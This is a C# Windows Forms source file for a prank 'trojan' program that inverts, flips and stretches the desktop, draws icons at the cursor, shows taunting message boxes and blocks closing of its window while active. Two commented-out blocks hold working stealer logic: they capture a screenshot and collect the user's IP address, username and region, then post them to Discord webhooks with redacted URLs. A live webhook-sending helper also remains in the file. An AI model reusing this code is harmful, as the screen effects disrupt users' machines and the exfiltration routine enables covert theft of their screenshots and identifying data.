﻿using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Windows;
using System.Linq;
using System.Management;
using System.Diagnostics;

namespace LOLZR
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hWnd);
        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
        CallingConvention = CallingConvention.StdCall)]
        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
        out IntPtr piSmallVersion, int amountIcons);
        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest,
        int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        TernaryRasterOperations dwRop);

        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();



        public enum TernaryRasterOperations
        {
            SRCCOPY = 0x00CC0020,
            SRCPAINT = 0x00EE0086,
            SRCAND = 0x008800C6,
            SRCINVERT = 0x00660046,
            SRCERASE = 0x00440328,
            NOTSRCCOPY = 0x00330008,
            NOTSRCERASE = 0x001100A6,
            MERGECOPY = 0x00C000CA,
            MERGEPAINT = 0x00BB0226,
            PATCOPY = 0x00F00021,
            PATPAINT = 0x00FB0A09,
            PATINVERT = 0x005A0049,
            DSTINVERT = 0x00550009,
            BLACKNESS = 0x00000042,
            WHITENESS = 0x00FF0062,
        }
        public static Icon Extract(string file, int number, bool largeIcon)
        {
            IntPtr large;
            IntPtr small;
            ExtractIconEx(file, number, out large, out small, 1);
            try
            {
                return Icon.FromHandle(largeIcon ? large : small);
            }
            catch
            {
                return null;
            }
        }

        bool safemode = false; //safemode!!!!! also: does nothing it was used in development, but then i did the settings menu.

        public Form1()
        {
            InitializeComponent();
        }
        Random r;
        private void Form1_Load(object sender, EventArgs e)
        {
            //this.BackColor = TransparencyKey;

            DialogResult r = System.Windows.Forms.MessageBox.Show("U really wanna start Lolz: Reborn?", "Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (r == DialogResult.Yes)
            {
                richTextBox1.Text += "\nSelected: " + r.ToString();
                /*
                var dir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "-img.png";
                var screenshot = Screenshott.TakeScreenshot();
                screenshot.Save(dir, ImageFormat.Png);
                MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
                var file = File.ReadAllBytes(dir);
                multipartFormDataContent.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(dir), dir);
                HttpClient client = new HttpClient();
                client.PostAsync("https://discord.com/api/webhooks/1...NUH-UH/skibidi", multipartFormDataContent).Wait();
                client.Dispose();
                */
            }
            else
            {
                System.Windows.Forms.MessageBox.Show("Alr then, bye (OK To close)", "Aight", MessageBoxButtons.OK, MessageBoxIcon.Information);
                System.Windows.Forms.Application.Exit();
                Environment.Exit(0);
            }
        }
        bool changescreenorientation = true;
        private void timer1_Tick(object sender, EventArgs e)
        {
            if (changescreenorientation)
            {
                timer1.Stop();
                r = new Random();
                if (timer1.Interval > 101)
                {
                    timer1.Interval -= 100;
                    IntPtr hwnd = GetDesktopWindow();
                    IntPtr hdc = GetWindowDC(hwnd);
                    int x = Screen.PrimaryScreen.Bounds.Width;
                    int y = Screen.PrimaryScreen.Bounds.Height;
                    StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                    StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                    StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                }
                else if (timer1.Interval > 51)
                {
                    timer1.Interval -= 10;
                    IntPtr hwnd = GetDesktopWindow();
                    IntPtr hdc = GetWindowDC(hwnd);
                    int x = Screen.PrimaryScreen.Bounds.Width;
                    int y = Screen.PrimaryScreen.Bounds.Height;
                    StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                    StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                    StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                }
                else
                {
                    timer1.Interval = 10;
                    IntPtr hwnd = GetDesktopWindow();
                    IntPtr hdc = GetWindowDC(hwnd);
                    int x = Screen.PrimaryScreen.Bounds.Width;
                    int y = Screen.PrimaryScreen.Bounds.Height;
                    StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                    StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                    StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);

                }
                timer1.Start();
            }
        }

        Icon icon = Extract("shell32.dll", 235, true);

        private void timer2_Tick(object sender, EventArgs e)
        {
            timer2.Stop();
            this.Cursor = new Cursor(Cursor.Current.Handle);
            int posX = Cursor.Position.X;
            int posY = Cursor.Position.Y;

            IntPtr desktop = GetWindowDC(IntPtr.Zero);
            using (Graphics g = Graphics.FromHdc(desktop))
            {
                g.DrawIcon(icon, posX, posY);
            }
            timer2.Start();
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            timer3.Stop();
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY);
            timer3.Interval = r.Next(5000);
            timer3.Start();
        }

        private void timer4_Tick(object sender, EventArgs e)
        {
            timer4.Stop();
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc, r.Next(x), r.Next(y), x = r.Next(500), y = r.Next(500), hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY);
            timer4.Interval = r.Next(1000);
            timer4.Start();
        }

        private void timer5_Tick(object sender, EventArgs e)
        {
            if (messageboxestimerenabled)
            {
                System.Windows.Forms.MessageBox.Show("Do you think that the worst person can change?", "I don't think so.", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
            }
        }

        private void timer6_Tick(object sender, EventArgs e)
        {
            if (messageboxestimerenabled)
            {
                System.Windows.Forms.MessageBox.Show("GIVE ME UR DISCORD TOKEN!!", "GIVE ME NOW!!!!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }
        bool safezone = true;
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!safezone)
            {
                e.Cancel = true;
            }
        }

        private void Form1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }
        public static void sendDisWebhook(string URL, string json)
        {
            var wr = WebRequest.Create(URL);
            wr.ContentType = "application/json";
            wr.Method = "POST";
            using (var sw = new StreamWriter(wr.GetRequestStream()))
                sw.Write(json);
            wr.GetResponse();
        }
        static class Screenshott
        {
            public static Bitmap TakeScreenshot()
            {
                var screenBounds = Screen.PrimaryScreen.Bounds;
                var bmp = new Bitmap(screenBounds.Width, screenBounds.Height);
                var g = Graphics.FromImage(bmp);
                g.CopyFromScreen(Point.Empty, Point.Empty, screenBounds.Size);
                return bmp;
            }
        }
        private void button1_Click(object sender, EventArgs e)
        {
            /*
            a lot of people disable their wifi when using """"trojans""""
            
            string name = WindowsIdentity.GetCurrent().Name;
            string text = "?";
            var dir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "-img.png";
            double height = SystemParameters.FullPrimaryScreenHeight;
            double width = SystemParameters.FullPrimaryScreenWidth;
            double resolution = height * width;
            var screenshot = Screenshott.TakeScreenshot();
            screenshot.Save(dir, ImageFormat.Png);
            HttpClient client = new HttpClient();
            MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
            var file = File.ReadAllBytes(dir);
            multipartFormDataContent.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(dir), dir);
            IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
            IPAddress[] addressList = hostEntry.AddressList;
            foreach (IPAddress iPAddress in addressList)
            {
                if (iPAddress.AddressFamily.ToString() == "InterNetwork")
                {
                    text = iPAddress.ToString();
                    new DiscordMessage().SetUsername("Diddy").AddEmbed().SetTimestamp(DateTime.Now)
                        .SetTitle("New person")
                        .SetAuthor("P. Diddy", (string)null, (string)null, (string)null)
                        .SetDescription("hi\n**-Message**:\n" + richTextBox1.Text + "\n**-IP**:\n" + text + "\n**-Username:**\n" + name + "\n**-Region:**\n" + RegionInfo.CurrentRegion.ToString())
                        .Build()
                        .SendMessage("https://discord.com/api/webhooks/im-not-leaking-it");
                    DiscordMessage val = new DiscordMessage();
                    val.Content = "IP:\n" + text + "Username:\n" + name + "Region:\n" + RegionInfo.CurrentRegion.ToString();
                    DiscordMessage val2 = val;
                    client.PostAsync("https://discord.com/api/webhooks/hiii, multipartFormDataContent).Wait();
                    client.Dispose();
                }
            }
            */
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            if (changescreenorientation == false && messageboxestimerenabled == false && randomiconsenabled == false && invertingscreencolorsenabled == false && randomiconsenabled == false && randomlittlethings == false) //is there any better way?
            {
                DialogResult r = System.Windows.Forms.MessageBox.Show("U literally disabled EVERYTHING (do u still wanna run it even though its not gonna do anything)", "Bro", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                if (r == DialogResult.Yes)
                {
                    safezone = false;
                    payload.pld(this, timer1, timer2, timer3, timer4, timer5, timer6, safezone);
                }
                else
                {
                    /*
                    System.Windows.Forms.MessageBox.Show("Alr", "Aight", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    System.Windows.Forms.Application.Exit();
                    Environment.Exit(0);
                    */
                }
            }
            else
            {
                safezone = false;
                payload.pld(this, timer1, timer2, timer3, timer4, timer5, timer6, safezone);
            }
        }
        int tickspeed = 100;
        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                List<Timer> Timerlist = new List<Timer>() { timer1, timer2, timer3, timer4, timer5, timer6 };

                tickspeed = int.Parse(textBox1.Text);
                label2  .Text = "Screen effects tickspeed: " + tickspeed.ToString();
                richTextBox1.Text += "\nChanging values...";
                foreach (Timer timer in Timerlist)
                {
                    timer.Interval = tickspeed;
                }
                richTextBox1.Text += "\nSuccess.";
                richTextBox1.Text += "\n" + timer1.Interval.ToString();
            }
            catch (Exception ex)
            {
                richTextBox1.Text += "\nError: " + ex.Message;// + "\nProbably u just put way too much numbers or a letter";
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        bool messageboxestimerenabled = true;
        private void button4_Click(object sender, EventArgs e)
        {
            bool enabled = true;

            //List<Timer> Timerlist = new List<Timer>() { timer5, timer6 };

            if (enabled)
            {
                enabled = false;
                //button4.Text = "Enable messageboxes timer";
                messageboxestimerenabled = false;
            }
            else
            {
                enabled = true;
                //button4.Text = "Disable messageboxes timer";
                messageboxestimerenabled = true;
            }
        }
        bool randomiconsenabled = true;

        private void timer2_Tick_1(object sender, EventArgs e)
        {
            if (randomiconsenabled)
            {
                timer2.Stop();
                this.Cursor = new Cursor(Cursor.Current.Handle);
                int posX = Cursor.Position.X;
                int posY = Cursor.Position.Y;

                IntPtr desktop = GetWindowDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop))
                {
                    g.DrawIcon(icon, posX, posY);
                }
                timer2.Start();
            }
        }
        bool invertingscreencolorsenabled = true;
        private void timer3_Tick_1(object sender, EventArgs e)
        {
            if (invertingscreencolorsenabled)
            {
                timer3.Stop();
                r = new Random();
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY);
                timer3.Interval = r.Next(5000);
                timer3.Start();
            }
        }
        bool randomlittlethings = true;
        private void timer4_Tick_1(object sender, EventArgs e)
        {
            if (randomlittlethings)
            {
                timer4.Stop();
                r = new Random();
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdc, r.Next(x), r.Next(y), x = r.Next(500), y = r.Next(500), hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY);
                timer4.Interval = r.Next(1000);
                InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                timer4.Start();
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            bool enabled = true;
            if (enabled)
            {
                richTextBox1.Text += "\n" + enabled.ToString();
                //disable
                enabled = false;
               // button5.Text = "Enable messageboxes timer";
                randomiconsenabled = false;
            }
            else if (!enabled)
            {
                richTextBox1.Text += "\n" + enabled.ToString();
                //enable
                enabled = true;
                //button5.Text = "Disable messageboxes timer";
                randomiconsenabled = true;
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            bool enabled = true;
            if (enabled)
            {
                enabled = false;
                //button6.Text = "Enable messageboxes timer";
                invertingscreencolorsenabled = false;
            }
            else
            {
                enabled = true;
                //button6.Text = "Disable messageboxes timer";
                invertingscreencolorsenabled = true;
            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                messageboxestimerenabled = true;
            }
            else
            {
                messageboxestimerenabled = false;
            }
            richTextBox1.Text += "\n" + messageboxestimerenabled.ToString();
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox2.Checked)
            {
                randomiconsenabled = true;
            }
            else
            {
                randomiconsenabled = false;
            }
            richTextBox1.Text += "\n" + randomiconsenabled.ToString();
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox3.Checked)
            {
                invertingscreencolorsenabled = true;
            }
            else
            {
                invertingscreencolorsenabled = false;
            }
            richTextBox1.Text += "\n" + invertingscreencolorsenabled.ToString();
        }

        private void checkBox4_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox4.Checked)
            {
                changescreenorientation = true;
            }
            else
            {
                changescreenorientation = false;
            }
            richTextBox1.Text += "\n" + changescreenorientation.ToString();
        }

        private void checkBox5_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox5.Checked)
            {
                randomlittlethings = true;
            }
            else
            {
                randomlittlethings = false;
            }
            richTextBox1.Text += "\n" + randomlittlethings.ToString();
        }

        private void checkBox6_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void button3_Click_1(object sender, EventArgs e)
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("select Name from Win32_VideoController"))
                {
                    foreach (var item in searcher.Get())
                    {
                        string cpuNameA = GetCpuName();
                        richTextBox1.Text += "\n - OSVersion: " + Environment.OSVersion + "\n - Is64Bits: " + Environment.Is64BitOperatingSystem.ToString() + "\n - Is64BitsProcess: " + Environment.Is64BitProcess.ToString() + "\n - MachineName: " + Environment.MachineName + "\n - GPU Name: " + item["Name"] + "\n - CPU Name: " + cpuNameA;
                    }
                }
            }
            catch (Exception ex)
            {
                richTextBox1.Text += "\n" + ex.Message;
            }
        }
        string GetCpuName()
        {
            string cpuname = string.Empty;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("select Name from Win32_Processor");
            foreach (ManagementObject item in searcher.Get())
            {
                cpuname = item["Name"].ToString();
            }
            return cpuname;
        }

        private void button4_Click_1(object sender, EventArgs e)
        {
            CleanLog(richTextBox1, true, "Log:");
        }

        static void CleanLog(RichTextBox log, bool defaultTextSetting, string defaultText)
        {
            if (defaultTextSetting)
            {
                log.Text = defaultText;
            }
            else
            {
                log.Clear();
            }
        }
    }
}
